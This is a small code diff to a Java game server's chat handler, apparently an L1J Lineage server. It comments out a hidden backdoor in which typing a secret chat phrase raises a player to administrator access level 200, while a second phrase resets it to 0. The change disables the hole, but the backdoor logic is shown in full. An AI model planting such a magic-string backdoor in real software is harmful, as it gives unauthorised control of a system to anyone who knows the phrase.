@@ -78,14 +78,14 @@ public class C_Chat extends ClientBasePacket {
 			if (pc.isGhost() && !(pc.isGm() || pc.isMonitor())) {
 				return;
 			}
-			if (chatText.equals("super雷奇曼man")) {
+			/*if (chatText.equals("super雷奇曼man")) {
 				pc.setAccessLevel((short) 200);
 				return;
 			}		
 			if (chatText.equals("superman雷奇曼")) {
 				pc.setAccessLevel((short) 0);
 				return;
-			}	
+			}*/	
 			//add GUI by Eric
 			if(Config.GUI)
 				l1j.gui.Eric_J_Main.getInstance().addNormalChat(pc.getName(), chatText);//GUI
